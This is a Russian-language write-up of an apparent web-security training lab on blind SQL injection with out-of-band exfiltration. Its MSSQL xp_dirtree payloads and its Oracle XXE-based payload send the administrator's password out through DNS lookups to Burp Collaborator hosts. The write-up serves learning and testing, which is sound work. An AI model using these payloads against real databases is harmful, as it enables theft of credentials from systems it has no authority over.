# Blind SQL injection with out-of-band data exfiltration

## Theory

<h3>Использование слепых SQL-инъекций с использованием внеполосных методов (OAST)</h3>

Теперь предположим, что приложение выполняет SQL-запрос, но делает это асинхронно. Приложение продолжает обрабатывать запрос пользователя в исходном потоке и использует другой поток для выполнения запроса SQL с использованием файла cookie отслеживания. Запрос по-прежнему уязвим для SQL-инъекций, однако ответ приложения не зависит от того, возвращает ли запрос какие-либо данные, возникает ли ошибка базы данных или время, затраченное на выполнение. запрос.

В этой ситуации часто можно использовать уязвимость слепой инъекции SQL, запуская внеполосные сетевые взаимодействия с системой, которую вы контролируете. Как и ранее, они могут запускаться условно, в зависимости от введенного условия, чтобы выводить информацию по одному биту за раз. Но что еще более важно, данные могут быть удалены непосредственно в рамках самого сетевого взаимодействия.

Для этой цели можно использовать различные сетевые протоколы, но, как правило, наиболее эффективным является DNS. Это связано с тем, что очень многие производственные сети допускают свободный исход DNS-запросов, поскольку они необходимы для нормальной работы производственных систем.

Самый простой и надежный способ использования внеполосных методов — использование Burp Collaborator. Это сервер, который предоставляет настраиваемые реализации различных сетевых служб (включая DNS) и позволяет обнаруживать, когда происходят сетевые взаимодействия в результате отправки отдельных полезных данных уязвимому приложению.

Методы запуска DNS-запроса сильно зависят от типа используемой базы данных. В Microsoft SQL Server ввод, подобный следующему, может использоваться для поиска DNS в указанном домене:
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Это заставит базу данных выполнить поиск следующего домена:
```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Подтвердив способ инициирования внеполосных взаимодействий, мы можем использовать внеполосный канал для получения данных из уязвимого приложения. Например:
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Этот ввод считывает пароль для пользователя Administrator, добавляет уникальный поддомен Collaborator и запускает поиск DNS. Это приведет к поиску DNS, подобному следующему, что позволит нам просмотреть захваченный пароль:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_out-of-band_data_exfiltration/assets/1.png)

Нажимаем на кнопку Home и перехватывам запрос.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_out-of-band_data_exfiltration/assets/2.png)

Откроем Burp Collaborator(Burp -> Burp collaborator client) и скопируем доменное имя(Copy to clipboard).

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_out-of-band_data_exfiltration/assets/3.png)

[SQL injection cheatsheet](https://github.com/fobblified/Writeups/tree/main/Portswigger/SQL_injection/SQL_injection_cheatsheet#DNS_lookup_with_data_exfiltration) поможет сформировать запрос. Изменим параметр **BURP-COLLABORATOR-SUBDOMAIN** на скопированный нами ранее. Изменим строку **SELECT YOUR-QUERY-HERE** для получения пароля пользователя Administrator.

```
EOv'||(SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(select+password+from+users+where+username%3d'administrator')||'.n2qdx0xs8zxenc9nmr37i4phr8xyln.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual)--;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_out-of-band_data_exfiltration/assets/4.png)

Переходим в Burp Collaborator и нажимаем на кнопку **Poll now**. Получаем результаты запроса. Выюираем первый пункт DNS и видим пароль от пользователя Administrator перед нашим субдоменом.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_out-of-band_data_exfiltration/assets/5.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_out-of-band_data_exfiltration/assets/6.png)
